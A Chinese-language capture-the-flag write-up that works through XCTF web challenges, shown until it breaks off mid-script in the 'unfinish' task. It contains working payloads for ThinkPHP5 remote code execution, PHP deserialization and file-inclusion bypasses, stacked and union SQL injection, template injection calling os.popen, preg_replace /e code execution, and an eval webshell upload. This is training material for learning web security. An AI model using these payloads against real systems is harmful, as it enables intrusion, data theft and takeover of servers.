# 攻防世界WEB

攻防世界WEB  
1.baby_web  
2.Training-WWW-Robots  
3.unserialize3  
4.Webphpunserialize  
5.php_rce  
6.Webphpinclude  
7.supersqli  
8.ics-06  
9.warmup  
10.NewsCenter  
11.NaNNaNNaNNaN-Batman  
12.web2  
13.PHP2  
14.upload1  
15.Webpythontemplate_injection  
16\. easytornado  
17.shrine  
18.fakebook  
19.mfw  
20.Cat  
21.ics-04  
22.ics-05  
23.lottery  
24.FlatScience  
25.bug  
26.ics-07  
27.unfinish  
28.i-got-id-200  
29.Webphpwrongnginxconfig  
30.comment

## 1.baby_web

根据提示猜测index.php页面，页面会进行重定向

bp抓包，查看响应头信息，发现flag。

flag{very_baby_web}

## 2.Training-WWW-Robots

根据题目信息，查看robots.txt,发现fl0g.php

cyberpeace{44f71c037d746b8030109e5d3478b515}

## 3.unserialize3

根据题目很容易判断应该是php反序列化

构造payload

<?php  
  
class xctf{ //定义一个名为xctf的类  
public $flag = '111'; //定义一个公有的类属性$flag，值为111  
public function __wakeup(){ //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本  
exit('bad requests');  
}  
}  
$test = new xctf(); //使用new运算符来实例化该类（xctf）的对象为test  
echo(serialize($test));  
?>

返回结果：

O:4:"xctf":1:{s:4:"flag";s:3:"111";}

根据wakeup()漏洞构造url

http://220.249.52.133:57412/?code=O:4:%22xctf%22:2:{s:4:%22flag%22;s:3:%22111%22;}

 **wakeup()** **漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过** wakeup的执行。

得到flag

cyberpeace{4dbbbcf7e392c04096750e062c69b2fa}

## 4.Webphpunserialize

<?php  
class Demo {  
private $file = 'index.php';  
public function __construct($file) {  
$this->file = $file;  
}  
function __destruct() {  
echo @highlight_file($this->file, true);  
}  
function __wakeup() {  
if ($this->file != 'index.php') {  
//the secret is in the fl4g.php  
$this->file = 'index.php';  
}  
}  
}  
if (isset($_GET['var'])) {  
$var = base64_decode($_GET['var']);  
if (preg_match('/[oc]:\d+:/i', $var)) {  
die('stop hacking!');  
} else {  
@unserialize($var);  
}  
} else {  
highlight_file("index.php");  
}  
?>

根据题目，很容易判断题目是php反序列化

分析题目可知：

在类 Demo 中有三个方法，一个构造，一个析构，还有就是一个魔术方法，构造函数 **construct()**
**在程序执行开始的时候对变量进行赋初值。析构函数** destruct()，在对象所在 函数执行完成之后，会自动调用，这里就会高亮显示出文件。
在反序列化执行之前，会先执行 __wakeup 这个魔术方法，所以需要绕过，当成员属性数目大 于实际数目时可绕过 wakeup 方法，正则匹配可以用 +
号来进行绕过

  * __construct()，创建时自动调用，用得到的参数覆盖$file
  * __destruct()，销毁时调用，会显示文件的代码，这里要显示php
  * __wakeup()，反序列化时调用，会把$file重置成php

题目过程，接受var变量并base64解码，匹配''/[oc]:\d+:/i''（首字母为o或c，冒号，一个或多个数字，冒号，忽略大小写），成功提示stop
hacking，失败反序列化var变量（程序结束会销毁新建的Demo对象，触发__destruct()）。

使用+可以绕过preg_match()，绕过__wakeup()是利用CVE-2016-7124，例如O:4:"Demo":2:{s:10:"\0Demo\0file";s:8:"fl4g.php";}（正常是O:4:"Demo":1:...），反序列化化时不会触发__wakeup(

 **编写payload**

<?php  
class Demo {  
private $file = 'index.php';  
public function __construct($file) {  
$this->file = $file;  
}  
function __destruct() {  
echo @highlight_file($this->file, true);  
}  
function __wakeup() {  
if ($this->file != 'index.php') {  
//the secret is in the fl4g.php  
$this->file = 'index.php';  
}  
}  
}  
$class = new Demo('fl4g.php');  
$class_str = serialize($class);  
print_r($class_str);  
print_r("\n")  
$a = str_replace('O:4','O:+4',$class_str);  
$a = str_replace(':1:',":2:",$a);  
$cla = base64_encode($a);  
print_r($cla);

执行结果

O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}  
TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

得到flag

ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}

## 5.php_rce

ThinkPHP5框架底层对控制器名过滤不严，可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞。

根据主页提示，可以发现网页使用的是ThinkPHP框架，版本为5.1,此版本存在getshell漏洞（百度一下payload一抓一大把）

 **查找flag**

http://192.168.100.161:54064/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find%20/%20-name%20%22flag%22

 **查看flag**

http://192.168.100.161:54064/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag

得到flag

flag{thinkphp5_rce}

## 6.Webphpinclude

题目代码：

<?php  
show_source(__FILE__);  
echo $_GET['hello'];  
$page=$_GET['page'];  
while (strstr($page, "php://")) {  
$page=str_replace("php://", "", $page);  
}  
include($page);  
?>

由代码可知此题应该为文件包含，而且应该利用php伪协议

strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE

 **方法一：**

可以利用PHP的大小写转换，利用PHP://input

php://filter

#执行文件  
page=Php://filter/resource=index.php  
#读取文件需要将文件名base64编码  
page=Php://filter/read=convert.base64-encode/resource=index.php

php://input

这个协议的利用方法是 将要执行的php代码写在post中提交，不用键与值的形式，只写代码即可。

<?php system("ls");?>  
<?php system("cat fl4gisisish3r3.php");?>

ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}

 **方法二：**

可以利用data协议

data: text/plain,<?php 执行内容 ?>

?page=data://text/plain,<?php system("ls");?>  
?page=data://text/plain,<?php system("cat fl4gisisish3r3.php");?>

查看源代码发现flag(本来还以为没有成功，用base64还尝试了一下，后来发现在源代码里)

ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}

 **方法三**

可以采用http://协议进行绕过

利用hello参数将执行内容显示，flag如图所示

http://220.249.52.133:58502/?page=http://127.0.0.1/index.php/?hello=<?system("ls");?>  
http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=<?show_source("fl4gisisish3r3.php");?>

得到flag

ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}

## 7.supersqli

先添加一个单引号，报错

接着测试--+注释，发现被过滤，然后使用#注释，可行 用order by语句判断出有两个字段，接着使用union select
爆字段，发现这个时候出现了如下提示：

return preg_match("/select|update|delete|drop|insert|where|\\./i",$inject);

可以利用 **堆叠注入**

payload

1';show databases;#  
1';show tables;#  
1';show columns from words;#  
1';show columns from `1919810931114514`;# (字符串为表名操作时要加反引号)

发现了flag，然后需要进行查询

这是就可以用各种各样的方法了

 **方法一：**

1';rename tables `words` to `words1`;rename tables `1919810931114514` to
`words`; alter table `words` change `flag` `id` varchar(100);#

这段代码的意思是将words表名改为words1，1919810931114514表名改为words，将现在的words表中的flag列名改为id
然后用1' or 1=1 #得到flag

flag{c168d583ed0d4d7196967b28cbd0b5e9}

 **方法二：**

payload（用了方法一后，要重新开一个才可以尝试方法二）

1';handler `1919810931114514` open;handler `1919810931114514` read first;#

handler语句的语法如下：

HANDLER tbl_name OPEN [ [AS] alias]  
  
HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)  
[ WHERE where_condition ] [LIMIT ... ]  
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }  
[ WHERE where_condition ] [LIMIT ... ]  
HANDLER tbl_name READ { FIRST | NEXT }  
[ WHERE where_condition ] [LIMIT ... ]  
  
HANDLER tbl_name CLOSE  
  
通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。  
通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ
NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。  
通过HANDLER tbl_name CLOSE来关闭打开的句柄。  
  
通过索引去查看的话可以按照一定的顺序，获取表中的数据。  
通过HANDLER tbl_name READ index_name
FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。  
  
通过索引列指定一个值，可以指定从哪一行开始。  
通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。

得到flag

flag{c168d583ed0d4d7196967b28cbd0b5e9}

 **方法三：**

虽然这里过滤了select和where等，但是可以通过执行多语句，将要执行的sql语句进行拼接，这样就可以将过滤的sql关键字拆分绕过检测

-1';use information_schema;set @sql=concat('s','elect column_name from columns wher','e table_name="1919810931114514"');PREPARE sql_query FROM @sql;EXECUTE sql_query;--+

这里@是定义一个用户自定义变量的意思  
PREPARE是预处理，这里预处理语句必须大写，格式就是PREPARE sqlquery from @sqlquery;execute sql_query;

-1';set @sql=concat('s','elect flag from `1919810931114514`;');PREPARE sql_query FROM @sql;EXECUTE sql_query;–-+

得到flag

flag{c168d583ed0d4d7196967b28cbd0b5e9}

## 8.ics-06

  1. 查看题目，发现id参数只能是数字
  2. 使用burp进行整数暴力破解，选择位置为id参数的值，有效载荷选择整数类型
  3. 攻击后查看响应包，发现id为2333时，响应包长度不同，可获取flag

cyberpeacef14694359c732d95c21cf5810c20cec4a]

## 9.warmup

查看源代码，发现source.php，得到源代码

<?php  
highlight_file(__FILE__);  
class emmm  
{  
public static function checkFile(&$page)  
{  
$whitelist = ["source"=>"source.php","hint"=>"hint.php"];  
if (! isset($page) || !is_string($page)) {  
echo "you can't see it";  
return false;  
}  
  
if (in_array($page, $whitelist)) {  
return true;  
}  
  
$_page = mb_substr(  
$page,  
0,  
mb_strpos($page . '?', '?')  
);  
if (in_array($_page, $whitelist)) {  
return true;  
}  
  
$_page = urldecode($page);  
$_page = mb_substr(  
$_page,  
0,  
mb_strpos($_page . '?', '?')  
);  
if (in_array($_page, $whitelist)) {  
return true;  
}  
echo "you can't see it";  
return false;  
}  
}  
  
if (! empty($_REQUEST['file'])  
&& is_string($_REQUEST['file'])  
&& emmm::checkFile($_REQUEST['file'])  
) {  
include $_REQUEST['file'];  
exit;  
} else {  
echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";  
}  
?>

mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置

mb_strpos (haystack ,needle )

haystack：要被检查的字符串。

needle：要搜索的字符串。

mb_substr(str,start,length) 函数返回字符串的一部分

返回字符串的提取部分，如果失败则返回 FALSE，或者返回一个空字符串

查看hint.php,发现

flag not here, and flag in ffffllllaaaagggg

(有人说这表明 flag 在这个文件中，且这个文件名暗示要使用四层目录，高手)

代码审计，发现需要满足四个条件

  * 要求$page为字符串
  * $page需要存在于$whitelist数组
  * 截取传进参数中首次出现?之前的部分，判断该部分是否存在于$whitelist数组中，，存在则返回 true
  * 先对构造的 payload 进行 url 解码，再截取传进参数中首次出现?之前的部分，并判断该部分是否存在于$whitelist中，存在则返回 true

以上四个满足一个即可返回 true，若均未满足，则返回 false

我们利用第三个 if 语句构造参数：  
?file=source.php?/../../../../ffffllllaaaagggg  
第一个?表示传参，第二个?用来满足截取

当然这一题亦可以根据截取构造payload

%25解码为%，%3f解码为？

file=source.php%253f/../../../../../ffffllllaaaagggg

最终得到flag

flag{25e7bce6005c4e0c983fb97297ac6e5a}

## 10.NewsCenter

简单的SQL注入，读取 information_schema 元数据，然后读取flag。

' order by 3#  
' order by 4#  
' union select 1,2,3#  
' union select 1,database(),3#  
' union select 1,2,group_concat(table_name) from information_schema.tables
where table_schema=database()#  
' union select 1,2,group_concat(column_name) from information_schema.columns
where table_name='news'#  
' union select 1,group_concat(id),group_concat(title,content) from news#  
' union select 1,2,group_concat(column_name) from information_schema.columns
where table_name='secret_table'#  
' union select 1,group_concat(id),group_concat(fl4g) from secret_table#

得到flag

QCTF{sq1_inJec7ion_ezzz}

## 11.NaNNaNNaNNaN-Batman

题目给了一个附件web100，发现大致是前端代码，用浏览器打开

然后…………

将eval改为alert

function $() {  
var e = document.getElementById("c").value;  
if (e.length == 16) if (e.match(/^be0f23/) != null) if (e.match(/233ac/) !=
null) if (e.match(/e98aa$/) != null) if (e.match(/c7be9/) != null) {  
var t = ["fl", "s_a", "i", "e}"];  
var n = ["a", "_h0l", "n"];  
var r = ["g{", "e", "_0"];  
var i = ["it'", "_", "n"];  
var s = [t, n, r, i];  
for (var o = 0; o < 13; ++o) {  
document.write(s[o % 4][0]);  
s[o % 4].splice(0, 1)  
}  
}  
}  
document.write('<input id="c"><button onclick=$()>Ok</button>');  
delete _

运行其中判断后面的部分代码，得到flag

flag{it's_a_h0le_in_0ne}

## 12.web2

得到源代码

<?php  
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";  
function encode($str){  
$_o=strrev($str);  
// echo $_o;  
for($_0=0;$_0<strlen($_o);$_0++){  
  
$_c=substr($_o,$_0,1);  
$__=ord($_c)+1;  
$_c=chr($__);  
$_=$_.$_c;  
}  
return str_rot13(strrev(base64_encode($_)));  
}  
  
highlight_file(__FILE__);  
/*  
逆向加密算法，解密$miwen就是flag  
*/  
?>

逆向这个加密算法，把给出的字符串逆向解密就能得到flag  
简单审计一下代码，写出逆向代码

  * $_o=strrev($str); 对$str字符串进行字符反转（比如 abc = cba）
  * 第二部分 for{……} 就是对 $str字符串 每个字符+1，（如：a=b、c=d）
  * return str_rot13(strrev(base64_encode($_))); 括号具有优先级，里面优先级最高，所以，按顺序：base64encode 先对 for循环后的字符串 进行base64加密，strrev 对字符串进行反转，strrot13 对字符串进行ROT13编码，return 返回值为：$miwen

str_rot13() 函数对字符串执行 ROT13 编码。

编写解密代码：定义一个decode方法，依次对字符串进行 ROT13解码 -> 字符串反转 -> base64解密 -> for{……} 每个字符减一 ->
字符串反转 -> 输出flag

<?php  
$str='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';  
$_ = base64_decode(strrev(str_rot13($str)));  
$_o=NULL;  
for($_0=0;$_0<strlen($_);$_0++){  
$_c=substr($_,$_0,1);  
$__=ord($_c)-1;  
$_c=chr($__);  
$_o=$_o.$_c;  
}  
  
echo strrev($_o);  
?>

得到falg

flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}

## 13.PHP2

打开题目，首页只有Can you anthenticate to this website?

盲猜index.php，发现还是什么都没有，扫描网站目录发现index.phps

not allowed!  
  
"); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == "admin") {
echo "  
  
Access granted!  
"; echo "  
  
Key: xxxxxxx  
"; } ?> Can you anthenticate to this website?

需要传入一个id并且这个id进行url解码后的值为admin,
这里需要注意的是当我们在浏览器输入admin时，浏览器会对admin进行一次url解码，所以需要对admin进行两次url编码才可

admin

%61%64%6d%69%6e

%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65

得到falg

cyberpeace{7273146d7aacb1498b7bb46ada534f4d}

## 14.upload1

最简单的文件上传，上传后抓包修改后缀名，菜刀连接后查看flag

cyberpeace{71a57a567d8cdb6341c8e9e0eec7659b}

## 15.Webpythontemplate_injection

页面直接点明python template injection

构造payload

#读取目录  
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}  
#读取文件  
{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}

或者利用命令执行读取flag

{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ls").re'+'ad()')}}

得到falg

ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}

## 16\. easytornado

查看页面发现flag in /fllllllllllllag

查看hints.txt发现信息 md5(cookie_secret+md5(filename))

 **分析：** url中的filehash是md5(cookie_secret+md5(filename))

可以构造payload为：file?filename=/fllllllllllllag&filehash=********************

filename已知道，只差filehash。

直接输入/fllllllllllllag尝试，url跳转页面显示error

./welcome.txt页面看到render，可能会是SSTI模板注入

SSTI模板注入详情：https://blog.csdn.net/zz_Caleb/article/details/96480967

先试着在flag.txt的url里直接把文件名修改成/fllllllllllllag，发现报错了出现两个参数

传递error?msg={{2}}，页面出现2

尝试{{2*2}}，返回ORZ，发现大部分词已经被过滤

…………想起题目Tornado，尝试payload

/error?msg={{handler.settings}}

得到cookie

cookie_secret': '968e1b79-9b4a-4b26-ae5f-093159b5127d'

构造payload

import hashlib  
import requests  
  
def md5(str):  
m = hashlib.md5()  
m.update(str.encode())  
return m.hexdigest()  
  
url = "http://220.249.52.133:41927"  
filename = '/fllllllllllllag'  
secret = '968e1b79-9b4a-4b26-ae5f-093159b5127d'  
  
filehash = md5(secret + md5(filename))  
  
urll = F"{url}/file?filename={filename}&filehash={filehash}"  
response = requests.get(urll)  
print(response.text)

得到flag

flag{3f39aea39db345769397ae895edb9c70}

## 17.shrine

进入题目发现一个Python代码

import flask  
import os  
  
app = flask.Flask(__name__)  
app.config['FLAG'] = os.environ.pop('FLAG')  
@app.route('/')  
def index():  
return open(__file__).read()  
  
@app.route('/shrine/<path:shrine>')  
def shrine(shrine):  
def safe_jinja(s):  
s = s.replace('(', '').replace(')', '')  
blacklist = ['config', 'self']  
return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s  
  
return flask.render_template_string(safe_jinja(shrine))  
  
if __name__ == '__main__':  
app.run(debug=True)

flask 在 /shrine/ 下的 SSTI，对 payload 进行了过滤，对小括号进行了替换，将 ( 和 ) 替换为空字符串，将 config 和
self 添加进了黑名单

构造payload

{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}

current_app,这是全局变量代理，查看他的config即可

得到falg

flag{shrine_is_good_ssti}

## 18.fakebook

首先进行信息收集，扫描一下文件目录，得到

login.php view.php robots.txt flag.php

发现robots.txt里面有一个/user.php.bak，发现user.php源代码

flag.php内容是空的

从login.php和view.php出发，打开看看，发现路径/var/www/html/view.php

得到falg.php路径为/var/www/html/falg.php

正常注册，登录，查看账号发现view.php?no=1

尝试注入

view.php?no=1 and 1=1#  
view.php?no=1 and 1=2#  
view.php?no=1 order by 3#  
view.php?no=1 order by 4#  
view.php?no=1 order by 5#  
view.php?no=2 union select 1,2,3,4#  
#发现被限制了，尝试绕过  
view.php?no=2 union/**/select 1,2,3,4#  
view.php?no=2 union++select 1,2,3,4#  
view.php?no=2 union++select 1,user(),3,4#  
view.php?no=2 union++select 1,database(),3,4#  
view.php?no=2 union/**/select 1,load_file("/var/www/html/flag.php"),3,4#

发现falg

flag{c1e552fdf77049fabf65168f22f7aeab}

## 19.mfw

根据题目提示发现git代码泄露，利用githack下载泄露的代码

发现flag.php,但是里面什么都没有，分析index.php

<?php  
  
if (isset($_GET['page'])) {  
$page = $_GET['page'];  
} else {  
$page = "home";  
}  
//以get方式获得一个page变量，如果没有，则设置为home  
  
$file = "templates/" . $page . ".php";  
//将page变量拼接成一个templates下的php文件，设置为变量file  
  
// I heard '..' is dangerous!  
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");  
//判断file中是否有" .. "，如果有则直接退出  
// TODO: Make this look nice  
assert("file_exists('$file')") or die("That file doesn't exist!")  
  
?>

ssert()函数会将括号中的字符当成代码来执行，并返回true或false。  
strpos()函数会返回字符串第一次出现的位置，如果没有找到则返回False

构造payload

page=abc') or system("cat templates/flag.php");//

查看源代码,发现flag

cyberpeace{e4b6f887ab74adfee1860b076d435bb4}

## 20.Cat

  1. 打开页面，有个输入框输入域名，输入com进行测试，发现无任何回显，输入127.0.0.1进行测试，发现已经执行成功，执行的是一个ping命令，一开始想的应该是命令拼接执行，但是输入任何有关拼接的字符串都会提示invalid url
  2. 大部分符号均被屏蔽，唯一收获到的是网站使用的是url编码能够传入，随便输入不同的url编码值，当输入边界值%80时系统产生报错
  3. 报错信息是一段html代码，将这些代码复制出来打开。看到了熟悉的django报错页面，看来是将输入的参数传到了后端的django服务中进行解析，而django设置了编码为gbk导致错误编码了宽字符（超过了ascii码范围）。
  4. 结合django的报错得知了项目的绝对路径为/opt/api百度找到方法应该要加@输入@/opt/api/api/settings.py
  5. 同上将报错信息已html文件打开，可看到一些敏感信息，继续查询@/opt/api/database.sqlite3，在报错信息中搜索CTF得到flag

flag为

WHCTF{yoooo_Such_A_G00D_@}

## 21.ics-04

简单测试发现密码找回功能存在注入，但是order by不能使用，直接使用union select 1,2……

经过测试发现目标有四列,第三列存在回显

' union select 1,2,group_concat(schema_name),4 from
information_schema.schemata;#  
' union select 1,2,group_concat(table_name),4 from information_schema.tables
where table_schema = 'cetc004'#  
' union select 1,2,group_concat(column_name),4 from information_schema.columns
where table_name = 'user'#  
' union select 1,2,group_concat(username),4 from cetc004.user#  
' union select 1,2,group_concat(password),4 from cetc004.user#  
' union select 1,2,group_concat(question),4 from cetc004.user#  
' union select 1,2,group_concat(answer),4 from cetc004.user#

可以得到密码的md5，但是无法解出来

分析更改密码的请求包，发现没有用户名，只有答案跟密码

猜测使用会话实现重置密码的功能，而会话是与用户名绑定的，因此我们可以构造一个SQL语句，使得查询出来的用户名是管理员的用户名，但是密保问题和答案是我们自己指定的，就可以成功重置密码了：1'
union select 'c3tlwDmIn23','202cb962ac59075b964b07152d234b70','1','2'#

其中202cb962ac59075b964b07152d234b70是 123 md5加密后的值。

然后更新密码。进入后得到flag

cyberpeace{70ed4a7a39a9766c67dac8df5c464370}

## 22.ics-05

探查网页，进项目录扫描，发现/index.php/login/?page=index,尝试利用php协议读取文件内容

/index.php?page=php://filter/read=convert.base64-encode/resource=index.php

进项base64解码，得到关键代码

//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试  
  
if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {  
  
echo "<br >Welcome My Admin ! <br >";  
  
$pattern = $_GET[pat];  
$replacement = $_GET[rep];  
$subject = $_GET[sub];  
  
if (isset($pattern) && isset($replacement) && isset($subject)) {  
preg_replace($pattern, $replacement, $subject);  
}else{  
die();  
}  
}  
?>

此处存在pregreplace函数，尝试测试是否存在命令注入漏洞  
函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。  
此处明显考察的是pregreplace 函数使用 /e 模式，导致代码执行的问题。也就是说，pat值和sub值相同，rep的代码就会执行。

XFF改成127.0.0.1之后，GET进来三个参数。这里调用了preg_replace函数。并且没有对pat进行过滤，所以可以传入"/e"触发漏洞,触发后replacement的语句是会得到执行的。

/index.php?pat=/test/e&rep=system("ls")⊂=test  
X-Forwarded-For:127.0.0.1

/index.php?pat=/test/e&rep=system("find / -name flag")⊂=test  
X-Forwarded-For:127.0.0.1

/index.php?pat=/test/e&rep=system("ls+./s3chahahaDir/flag")⊂=test  
X-Forwarded-For:127.0.0.1

/index.php?pat=/test/e&rep=system("cat+./s3chahahaDir/flag/flag.php")⊂=test  
X-Forwarded-For:127.0.0.1

得到falg

cyberpeace{28535e0eea8ff577fda029f29b5213c5}

## 23.lottery

首先进行正常的目录扫描，发现git代码泄露，利用githack下载代码， 发现了api.php

function buy($req){  
require_registered();  
require_min_money(2);  
  
$money = $_SESSION['money'];  
$numbers = $req['numbers'];  
$win_numbers = random_win_nums();  
$same_count = 0;  
for($i=0; $i<7; $i++){  
if($numbers[$i] == $win_numbers[$i]){  
$same_count++;  
}  
}  
switch ($same_count) {  
case 2:  
$prize = 5;  
break;  
case 3:  
$prize = 20;  
break;  
case 4:  
$prize = 300;  
break;  
case 5:  
$prize = 1800;  
break;  
case 6:  
$prize = 200000;  
break;  
case 7:  
$prize = 5000000;  
break;  
default:  
$prize = 0;  
break;  
}  
$money += $prize - 2;  
$_SESSION['money'] = $money;  
response(['status'=>'ok','numbers'=>$numbers, 'win_numbers'=>$win_numbers,
'money'=>$money, 'prize'=>$prize]);  
}  
  
function flag($req){  
global $flag;  
global $flag_price;  
  
require_registered();  
$money = $_SESSION['money'];  
if($money < $flag_price){  
response_error('you don\' have enough money');  
} else {  
$money -= $flag_price;  
$_SESSION['money'] = $money;  
$msg = 'Here is your flag: ' . $flag;  
response(['status'=>'ok','msg'=>$msg, 'money'=>$money]);  
}  
}

阅读源码我们发现，

requests是json格式的，比较彩票数字与用户数字采用==弱比较，而且是一位一位的比较的

由于使用的是PHP 弱类型比较，TRUE,1,"1"都相等相等，即true与字符串和数字都是弱相等的。而且，由于 json
支持布尔型数据，那么就可以构造一串数组[true,true,true,true,true,true,true]传入了，

构造payload

{"action":"buy","numbers":[true,true,true,true,true,true,true]}

得到flag

cyberpeace{720d45f9c4332c4b53d92ce8c3a0be7c}

## 24.FlatScience

扫描目录发现，admin.php，login.php

首先查看admin.php，只发现了do not even try to bypass this

查看login.php，发现TODO: Remove ?debug-Parameter!

构造/login.php?debug

发现源代码

尝试注入发现SQLite3::query(): Unable to prepare statement: 1, unrecognized token:
"#" in /var/www/html/login.php on line 47

根据源代码构造payload

' union select name,sql from sqlite_master--+

然后查询到返回包里面有Set-Cookie字段

CREATE TABLE Users(  
id int primary key,  
name varchar(255),  
password varchar(255),  
hint varchar(255)  
)

查询其它数据

usr=%27 UNION SELECT id, id from Users limit 0,1--+&pw=chybeta  
usr=%27 UNION SELECT id, name from Users limit 0,1--+&pw=chybeta  
usr=%27 UNION SELECT id, password from Users limit 0,1--+&pw=chybeta  
usr=%27 UNION SELECT id, hint from Users limit 0,1--+&pw=chybeta

返回结果

my+fav+word+in+my+fav+paper?!  
my+love+isâ¦?  
the+password+is+password

上面的源码中的查询语句的password就是对密码+salt进行了sha1，我们登陆的话应该需要利用sha1函数和salt找出密码，admin的hint是
+my+fav+word+in+my+fav+paper?!，那会不会密码藏在pdf文件中呢？

爬取站点中所有的pdf文件，总共30个，然后用脚本进行解析处理，并用sha1函数与加密的密码进行碰撞已找出正确的密码，拿大佬的脚本：

from cStringIO import StringIO  
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter  
from pdfminer.converter import TextConverter  
from pdfminer.layout import LAParams  
from pdfminer.pdfpage import PDFPage  
import sys  
import string  
import os  
import hashlib  
  
def get_pdf():  
return [i for i in os.listdir("./") if i.endswith("pdf")]  
  
  
def convert_pdf_2_text(path):  
rsrcmgr = PDFResourceManager()  
retstr = StringIO()  
device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams())  
interpreter = PDFPageInterpreter(rsrcmgr, device)  
with open(path, 'rb') as fp:  
for page in PDFPage.get_pages(fp, set()):  
interpreter.process_page(page)  
text = retstr.getvalue()  
device.close()  
retstr.close()  
return text  
  
  
def find_password():  
pdf_path = get_pdf()  
for i in pdf_path:  
print "Searching word in " + i  
pdf_text = convert_pdf_2_text(i).split(" ")  
for word in pdf_text:  
sha1_password = hashlib.sha1(word+"Salz!").hexdigest()  
if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':  
print "Find the password :" + word  
exit()  
  
if __name__ == "__main__":  
find_password()

跑出admin的密码为：ThinJerboa

得到flag

flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}

## 25.bug

进入界面发现有注册，登录，忘记密码功能，尝试对登录界面进行注入，发现似乎没有注入，但是使用admin登录时，发现存在该用户。猜测利用忘记密码功能来修改admin的密码。

正常注册，然后忘记密码，信息正确之后，输入新密码时抓包发现果然有用户名和密码两个参数，修改admin的密码，然后进入界面。

管理界面显示ip不正确，构造XFF请求头，绕过限制，发现一个url

index.php?module=filemanage&do=???

经过测试发现动作是upload。

进行图片上传，构造payload

<script language="php">system("ls");</script> XXX.php5

发现flag

cyberpeace{9fe4c7a6a6b5bb0a67a109df0c528768}

## 26.ics-07

正常查看页面，发现index.php，查看view-source，进行代码审计

<?php  
session_start();  
  
if (!isset($_GET[page])) {  
show_source(__FILE__);  
die();  
}  
  
if (isset($_GET[page]) && $_GET[page] != 'index.php') {  
include('flag.php');  
}else {  
header('Location: ?page=flag.php');  
}  
?>

<?php  
if ($_SESSION['admin']) {  
$con = $_POST['con'];  
$file = $_POST['file'];  
$filename = "backup/".$file;  
  
if(preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename)){  
die("Bad file extension");  
}else{  
chdir('uploaded');  
$f = fopen($filename, 'w');  
fwrite($f, $con);  
fclose($f);  
}  
}  
?>

<?php  
if (isset($_GET[id]) && floatval($_GET[id]) === '1' && substr($_GET[id], -1)
=== '9') {  
include 'config.php';  
$id = mysql_real_escape_string($_GET[id]);  
$sql="select * from cetc007.user where id='$id'";  
$result = mysql_query($sql);  
$result = mysql_fetch_object($result);  
} else {  
$result = False;  
die();  
}  
  
if(!$result)die("<br >something wae wrong ! <br>");  
if($result){  
echo "id: ".$result->id."</br>";  
echo "name:".$result->user."</br>";  
$_SESSION['admin'] = True;  
}  
?>

大概思路是在id满足第三段代码的情况下，使$_SESSION['admin'] =
True。然后在以POST方式提供con和file，当file满足条件时，会将con的内容写入uploaded /backup
/filename中。在在第一段中包含此文件，可以得到flag.php

先构造view-source.php?page=1

进入一个提交page参数和id参数的地方。根据第三个代码进行绕过

我发现源代码floatval($_GET[id]) !== '1'有点问题，应该是===

构造payload

id = 1 9 / id = 1-9 /id = 1' or '9'='9

得到id=1 name=admin,继续构造，根据获取文件后缀进行正则匹配的时候，只会匹配最后一个.后的内容，所以通过php/.绕过

con=<?php @eval($_POST['pass']);?>&file=shell.php/.

L利用蚁剑链接，找到得到flag

cyberpeace{48a728d63427181480eec0ddb20886ad}

## 27.unfinish

进入后，正常测试，没有什么结果，利用dirsearch扫描一下目录，发现了

/config.php  
/login.php  
/register.php

进入注册界面注册账号，登录界面，发现登录之后会页面显示用户名，突然想到二次注入

构造payload

0'+ascii(substr((select * from flag) from 1 for 1))+'0

脚本

def getFlag(inject_page, show_page):  
flag = ''  
for i in range(40):  
data_flag = {  
'username':"0'+ascii(substr((select * from flag) from "+str(i+1)+" for
1))+'0",  
'password':'admin',  
"email":"admin32@admin.com"+str(i)  
}  
